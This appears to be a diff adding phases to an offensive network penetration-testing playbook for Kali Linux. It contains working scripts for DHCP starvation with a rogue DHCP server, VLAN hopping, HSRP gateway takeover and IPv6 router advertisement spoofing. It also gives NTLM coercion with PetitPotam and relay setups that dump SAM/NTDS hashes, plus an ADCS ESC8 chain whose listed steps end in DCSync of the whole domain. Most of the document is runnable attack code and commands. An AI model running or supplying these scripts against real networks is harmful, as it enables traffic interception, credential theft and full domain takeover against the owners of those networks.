@@ -148,6 +148,272 @@ arp -a | grep "$TARGET_IP" | grep -q "$KALI_IP" && \
 
 ---
 
+## Phase 2b — DHCP Starvation + Rogue DHCP (Stealthier than ARP)
+
+DHCP-based MITM is cleaner than ARP spoofing — no gratuitous ARPs to alert IDS, and every new
+host automatically uses Kali as gateway and DNS:
+
+```bash
+IFACE=<interface>
+KALI_IP=<kali_ip>
+ENG=/home/kali/current
+
+echo "=== [Phase 2b] DHCP Starvation + Rogue DHCP ==="
+echo ""
+
+# Step 1: Exhaust the legitimate DHCP server's address pool
+echo "--- Step 1: DHCP pool exhaustion (200 fake DISCOVER packets) ---"
+which yersinia 2>/dev/null && {
+    echo "Using yersinia (GUI: select DHCP → Attack 1)..."
+    timeout 30 yersinia dhcp -attack 1 -interface "$IFACE" 2>/dev/null || \
+        echo "Run: yersinia -G   (GUI → DHCP → 'send RAW packet' flood)"
+} || {
+    echo "Using scapy DHCP flood..."
+    python3 << 'EOF'
+from scapy.all import *
+import random, time
+
+print("Flooding DHCP with fake MACs...")
+for i in range(300):
+    mac = ':'.join(['%02x' % random.randint(0,255) for _ in range(6)])
+    mac_bytes = bytes.fromhex(mac.replace(':', ''))
+    pkt = (Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
+           IP(src='0.0.0.0', dst='255.255.255.255') /
+           UDP(sport=68, dport=67) /
+           BOOTP(chaddr=mac_bytes, xid=random.randint(0, 0xffffffff)) /
+           DHCP(options=[('message-type', 'discover'), 'end']))
+    sendp(pkt, iface=None, verbose=0)
+    time.sleep(0.05)
+print(f"DHCP pool exhaustion complete ({300} packets sent)")
+EOF
+}
+
+echo ""
+echo "--- Step 2: Serve rogue DHCP (Kali as gateway + DNS) ---"
+# All new DHCP requests go to us — we route as gateway (automatic MITM)
+KALI_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -1)
+SUBNET_BASE=$(echo "$KALI_IP" | cut -d. -f1-3)
+
+cat > /tmp/rogue_dhcp.conf << EOF
+interface=$IFACE
+dhcp-range=${SUBNET_BASE}.150,${SUBNET_BASE}.200,255.255.255.0,12h
+dhcp-option=3,$KALI_IP
+dhcp-option=6,$KALI_IP
+dhcp-option=252,http://$KALI_IP/wpad.dat
+server=8.8.8.8
+log-queries
+log-dhcp
+EOF
+
+dnsmasq -C /tmp/rogue_dhcp.conf --pid-file=/tmp/rogue_dhcp.pid 2>/dev/null &
+echo "Rogue DHCP started — new hosts use Kali as gateway + DNS"
+echo "Advantages over ARP spoof: no ARP anomalies, persists across client reconnects, affects all new clients"
+echo ""
+echo "Monitor new DHCP leases: tail -f /var/log/syslog | grep DHCP"
+echo "Kill: kill \$(cat /tmp/rogue_dhcp.pid)"
+```
+
+---
+
+## Phase 2c — VLAN Hopping (802.1Q Double Tagging)
+
+Reach management VLANs that are supposed to be unreachable:
+
+```bash
+IFACE=<interface>
+ENG=/home/kali/current
+
+echo "=== [Phase 2c] VLAN Hopping ==="
+echo ""
+
+# Check if DTP (Dynamic Trunking Protocol) is active on our switch port
+echo "--- DTP trunk negotiation attack ---"
+which yersinia 2>/dev/null && {
+    echo "Running yersinia DTP attack (make our port a trunk)..."
+    timeout 10 yersinia -I 2>/dev/null || echo "GUI: yersinia -G → 802.1Q → DTP Attack"
+}
+
+echo ""
+echo "--- 802.1Q double-tagging probe ---"
+echo "Outer VLAN = native VLAN (untagged on trunk). Inner VLAN = target (unreachable management VLAN)."
+echo "Switch strips outer tag and forwards inner-tagged frame to management VLAN."
+echo ""
+
+# Double-tag attack with scapy
+python3 << 'VLANEOF'
+from scapy.all import *
+import sys
+
+iface = "$IFACE"
+outer_vlan = 1    # native VLAN (untagged on trunk) — change to match switch config
+inner_vlan = 10   # management VLAN target — try 10, 20, 100, 200
+
+print(f"Sending double-tagged frames: outer VLAN {outer_vlan} → inner VLAN {inner_vlan}")
+print("If switch accepts trunk → management VLAN traffic accessible from Kali")
+
+# Send probes to management VLAN hosts
+for dst_ip in [f"192.168.{inner_vlan}.1", f"10.{inner_vlan}.0.1", f"172.16.{inner_vlan}.1"]:
+    pkt = (Ether(dst='ff:ff:ff:ff:ff:ff') /
+           Dot1Q(vlan=outer_vlan) /
+           Dot1Q(vlan=inner_vlan) /
+           IP(dst=dst_ip, src='192.168.1.100') /
+           ICMP())
+    sendp(pkt, iface=iface, verbose=0)
+    print(f"  Probe sent to {dst_ip} via VLAN {inner_vlan}")
+
+# Sniff for responses from management VLAN
+print("Listening for responses from management VLAN (5 seconds)...")
+result = sniff(iface=iface, timeout=5, filter=f"vlan {inner_vlan}", count=5)
+if result:
+    print(f"  [+] Got {len(result)} responses from VLAN {inner_vlan}!")
+    result.show()
+else:
+    print(f"  No responses. Try different outer_vlan={outer_vlan} (must match switch native VLAN)")
+VLANEOF
+
+echo ""
+echo "If VLAN hopping works:"
+echo "  → Add sub-interface: ip link add link $IFACE name $IFACE.10 type vlan id 10"
+echo "  → Bring it up: ip link set $IFACE.10 up && dhclient $IFACE.10"
+echo "  → Scan management VLAN: /pt-net $IFACE.10"
+```
+
+---
+
+## Phase 2d — HSRP/VRRP Gateway Takeover
+
+Become the active router on networks using Cisco HSRP or standard VRRP:
+
+```bash
+IFACE=<interface>
+ENG=/home/kali/current
+
+echo "=== [Phase 2d] HSRP/VRRP Gateway Takeover ==="
+echo ""
+
+# Detect HSRP/VRRP traffic first
+echo "--- Sniffing for HSRP/VRRP advertisements ---"
+echo "HSRP sends Hellos to 224.0.0.2 on UDP 1985 every 3 seconds"
+echo "VRRP sends Advertisements to 224.0.0.18 on protocol 112"
+timeout 15 tcpdump -i "$IFACE" -nn '(udp port 1985) or (proto 112)' 2>/dev/null | \
+    head -10 | tee /tmp/hsrp_detected.txt
+
+if grep -q "1985\|VRRP\|224.0.0" /tmp/hsrp_detected.txt 2>/dev/null; then
+    echo "[!] HSRP/VRRP traffic detected — network uses redundant gateways!"
+    VIRTUAL_GW=$(tcpdump -i "$IFACE" -nn 'udp port 1985' -c 3 2>/dev/null | \
+        grep -oP '\d+\.\d+\.\d+\.\d+' | tail -1)
+    echo "  Virtual gateway: $VIRTUAL_GW"
+
+    echo ""
+    echo "--- HSRP takeover with yersinia ---"
+    which yersinia 2>/dev/null && \
+        echo "GUI: yersinia -G → HSRP → 'Becoming Active Router'" || \
+        echo "Install: apt install -y yersinia"
+
+    echo ""
+    echo "--- HSRP takeover with scapy (priority 255 beats all) ---"
+    python3 << 'HSRPEOF'
+from scapy.all import *
+import time, sys
+
+iface = "$IFACE"
+kali_ip = "$KALI_IP"
+virtual_ip = "$VIRTUAL_GW" or "192.168.1.1"
+
+print(f"Sending HSRP Hello with priority 255 (highest = becomes active router)")
+print(f"Target virtual gateway: {virtual_ip}")
+print("Ctrl+C to stop. Allow 10-15 seconds for holdtime to expire.")
+
+try:
+    while True:
+        # HSRP version 1 Hello with priority 255
+        pkt = (Ether(dst='01:00:5e:00:00:02', src=get_if_hwaddr(iface)) /
+               IP(src=kali_ip, dst='224.0.0.2', ttl=1) /
+               UDP(sport=1985, dport=1985) /
+               Raw(load=bytes([0,       # version 1
+                               0,       # hello message type
+                               3,       # state: active
+                               255,     # priority (255 = highest possible)
+                               3, 0,    # hellotime, holdtime
+                               0, 0,    # reserved
+                               0xc0,0xa8,0x01,0x01,  # group virtual IP
+                               0,0,0,0  # auth (none)
+                               ])))
+        sendp(pkt, iface=iface, verbose=0)
+        time.sleep(3)
+except KeyboardInterrupt:
+    print("Stopped. If takeover succeeded, add virtual IP to interface:")
+    print(f"  ip addr add {virtual_ip}/24 dev {iface}")
+HSRPEOF
+fi
+```
+
+---
+
+## Phase 2e — ICMPv6 Router Advertisement Spoofing
+
+Faster than mitm6 — immediately routes all IPv6 traffic through Kali:
+
+```bash
+IFACE=<interface>
+KALI_IP=<kali_ip>
+ENG=/home/kali/current
+
+echo "=== [Phase 2e] ICMPv6 Router Advertisement Spoofing ==="
+echo ""
+echo "Send fake IPv6 Router Advertisements — all hosts auto-configure Kali as IPv6 router."
+echo "Works instantly (no DHCPv6 needed, no waiting for LLMNR queries)."
+echo "Combine with ntlmrelayx for immediate NTLM hash relay."
+echo ""
+
+# Enable IPv6 forwarding
+echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
+echo 1 > /proc/sys/net/ipv6/conf/"$IFACE"/forwarding
+echo "[+] IPv6 forwarding enabled"
+
+# Get Kali's link-local address
+KALI_LL=$(ip -6 addr show "$IFACE" scope link 2>/dev/null | grep -oP '(?<=inet6 )[^/]+' | head -1)
+[ -z "$KALI_LL" ] && KALI_LL="fe80::1"
+KALI_MAC=$(cat /sys/class/net/$IFACE/address 2>/dev/null)
+echo "Kali link-local: $KALI_LL ($KALI_MAC)"
+
+# Send Router Advertisements in background
+python3 << 'RAEOF' &
+from scapy.all import *
+import time
+
+iface = "$IFACE"
+kali_mac = "$KALI_MAC"
+kali_ll = "$KALI_LL"
+
+print(f"Broadcasting IPv6 Router Advertisements every 5s (Kali = IPv6 default router)")
+print(f"All hosts will auto-configure {kali_ll} as their IPv6 default gateway")
+
+while True:
+    ra = (Ether(src=kali_mac, dst='33:33:00:00:00:01') /
+          IPv6(src=kali_ll, dst='ff02::1', hlim=255) /
+          ICMPv6ND_RA(routerlifetime=9000, reachabletime=30000, retranstimer=1000) /
+          ICMPv6NDOptSrcLLAddr(lladdr=kali_mac) /
+          ICMPv6NDOptPrefixInfo(
+              prefix='2001:db8::', prefixlen=64,
+              L=1, A=1,
+              validlifetime=86400, preferredlifetime=14400))
+    sendp(ra, iface=iface, verbose=0)
+    time.sleep(5)
+RAEOF
+
+RA_PID=$!
+echo "Router Advertisement loop PID: $RA_PID"
+echo ""
+echo "All IPv6-capable hosts will now route IPv6 through Kali within ~10 seconds."
+echo "Combine with NTLM relay for immediate hash capture:"
+echo "  ntlmrelayx.py -6 -t ldaps://<dc-ip> --delegate-access --add-computer"
+echo ""
+echo "Monitor IPv6 neighbors: ip -6 neigh show dev $IFACE"
+```
+
+---
+
 ## Phase 3 — DNS Spoofing
 
 Once in MITM position, redirect DNS queries to Kali-hosted services:
@@ -365,6 +631,143 @@ echo "  responder -I $IFACE -rdw 2>/dev/null"
 echo ""
 echo "Dumped hashes → $ENG/loot/hashes/relayed_hashes.txt"
 echo "Relay log → $ENG/loot/hashes/ntlmrelayx_output.txt"
+```
+
+---
+
+## Phase 7b — Coercion Attacks (Force Windows Auth Instantly)
+
+Unlike Responder (which waits for random LLMNR queries), coercion attacks **force** any Windows
+host to authenticate to Kali immediately — no user interaction, no waiting:
+
+```bash
+IFACE=<interface>
+TARGET=<target_dc_or_windows_host>
+KALI_IP=<kali_ip>
+ENG=/home/kali/current
+
+echo "=== [Phase 7b] Coercion Attacks — Force Windows Auth ==="
+echo ""
+echo "Strategy: start ntlmrelayx, then coerce targets → instant relay without waiting"
+echo ""
+
+# IMPORTANT: Disable Responder SMB/HTTP servers before relaying
+sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf 2>/dev/null
+sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf 2>/dev/null
+
+# Build relay target list
+SUBNET=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+/\d+' | head -1 | sed 's|\.[0-9]*/|.0/|')
+netexec smb "$SUBNET" --gen-relay-list $ENG/loot/relay_targets.txt 2>/dev/null
+echo "Relay targets (SMB signing disabled): $(wc -l < $ENG/loot/relay_targets.txt 2>/dev/null)"
+
+# Start ntlmrelayx ready to receive coerced auth
+echo "Starting ntlmrelayx (secretsdump mode)..."
+ntlmrelayx.py \
+    -tf "$ENG/loot/relay_targets.txt" \
+    -smb2support \
+    --secretsdump \
+    -of $ENG/loot/hashes/coerced_hashes.txt \
+    2>/dev/null | tee $ENG/loot/hashes/coerce_relay.txt | \
+    grep -E "SUCCEED|Administrator|hash|relayed" &
+RELAY_PID=$!
+sleep 2
+
+# --- PetitPotam (EFSRPC — no authentication required!) ---
+echo ""
+echo "--- PetitPotam (EFSRPC coercion — NO CREDS NEEDED) ---"
+PETITPOTAM=$(which petitpotam.py 2>/dev/null || echo "/opt/PetitPotam/PetitPotam.py")
+[ -f "$PETITPOTAM" ] && {
+    python3 "$PETITPOTAM" "$KALI_IP" "$TARGET" 2>/dev/null | tail -5
+    echo "  [!] PetitPotam sent — check ntlmrelayx output for relayed auth"
+} || {
+    echo "  Install: git clone https://github.com/topotam/PetitPotam /opt/PetitPotam"
+    echo "  Run: python3 /opt/PetitPotam/PetitPotam.py $KALI_IP $TARGET"
+}
+
+# --- PrinterBug (MS-RPRN — needs ANY valid domain creds) ---
+echo ""
+echo "--- PrinterBug (MS-RPRN Print Spooler) ---"
+echo "  Needs valid creds (even guest): python3 /opt/impacket/examples/printerbug.py 'DOMAIN/user:pass@$TARGET' $KALI_IP"
+echo "  Or via netexec: netexec smb $TARGET -u <user> -p <pass> -M spooler"
+# Try with null session first
+ntlmrelayx_test=$(netexec smb $TARGET -u '' -p '' -M spooler 2>/dev/null | grep -i "spooler\|running")
+[ -n "$ntlmrelayx_test" ] && echo "  Print Spooler status: $ntlmrelayx_test"
+
+# --- DFSCoerce (MS-DFSNM — works on DCs even when PetitPotam is patched) ---
+echo ""
+echo "--- DFSCoerce (MS-DFSNM) ---"
+DFSCOERCE=$(which dfscoerce.py 2>/dev/null || echo "/opt/DFSCoerce/dfscoerce.py")
+[ -f "$DFSCOERCE" ] && \
+    echo "  Run: python3 $DFSCOERCE -u <user> -p <pass> -d <domain> $KALI_IP $TARGET" || \
+    echo "  Install: git clone https://github.com/dirkjanm/DFSCoerce /opt/DFSCoerce"
+
+echo ""
+echo "Monitor coercion results: tail -f $ENG/loot/hashes/coerce_relay.txt"
+echo "If relay succeeds → SAM/NTDS dump saved to $ENG/loot/hashes/coerced_hashes.txt"
+```
+
+---
+
+## Phase 7c — WinRM Relay + Active Directory Certificate Services
+
+```bash
+TARGET=<target_host>
+DC_IP=<domain_controller_ip>
+KALI_IP=<kali_ip>
+ENG=/home/kali/current
+
+echo "=== [Phase 7c] WinRM Relay + ADCS ESC8 ==="
+echo ""
+
+# --- WinRM relay (get PowerShell instead of SMB shell) ---
+echo "--- WinRM relay → direct PowerShell session ---"
+echo "WinRM relay works when SMB signing is required (blocks SMB relay)."
+echo ""
+echo "Starting ntlmrelayx targeting WinRM..."
+ntlmrelayx.py \
+    -t "winrm://$TARGET" \
+    -smb2support \
+    2>/dev/null | tee $ENG/loot/hashes/winrm_relay.txt | \
+    grep -E "SUCCEED|session|shell" &
+WINRM_PID=$!
+echo "ntlmrelayx WinRM PID: $WINRM_PID"
+echo "Coerce $TARGET to auth: python3 /opt/PetitPotam/PetitPotam.py $KALI_IP $TARGET"
+echo "When relay succeeds, connect: evil-winrm -i $TARGET -u <user> -H <ntlm-hash>"
+echo ""
+
+# --- ADCS ESC8 relay (relay to Certificate Authority for cert-based persistence) ---
+echo "--- ADCS ESC8 — relay to Active Directory Certificate Services ---"
+echo ""
+
+# Find the CA
+echo "Finding Certificate Authority..."
+CA_HOST=$(netexec ldap "$DC_IP" -u '' -p '' -M adcs 2>/dev/null | \
+    grep -oP '(?<=Certificate Authority: )[^\s]+' | head -1)
+[ -z "$CA_HOST" ] && CA_HOST="$DC_IP"
+echo "  CA: $CA_HOST"
+echo ""
+
+# Check if CA's HTTP enrollment endpoint is up
+CA_ENROLL=$(curl -sk -o /dev/null -w "%{http_code}" \
+    --max-time 5 "http://$CA_HOST/certsrv/" 2>/dev/null)
+echo "  CA enrollment endpoint (HTTP): $CA_ENROLL"
+
+[ "$CA_ENROLL" != "000" ] && {
+    echo "  [+] CA enrollment endpoint accessible — ADCS ESC8 attack possible!"
+    echo ""
+    echo "  Step 1: Start ntlmrelayx targeting ADCS enrollment endpoint:"
+    echo "    ntlmrelayx.py -t 'http://$CA_HOST/certsrv/certfnsh.asp' -smb2support --adcs --template DomainController"
+    echo ""
+    echo "  Step 2: Coerce the DC to authenticate to Kali:"
+    echo "    python3 /opt/PetitPotam/PetitPotam.py $KALI_IP $DC_IP"
+    echo ""
+    echo "  Step 3: ntlmrelayx will request a DomainController cert for the DC machine account"
+    echo "  Step 4: Use the cert to get the DC's NT hash:"
+    echo "    certipy auth -pfx dc.pfx -dc-ip $DC_IP"
+    echo "    → NT hash of DC machine account → DCSYNC → entire domain"
+    echo ""
+    echo "  Alternative: Rubeus (Windows) - asktgt /user:DC$ /certificate:dc.pfx /ptt"
+}
 ```
 
 ---
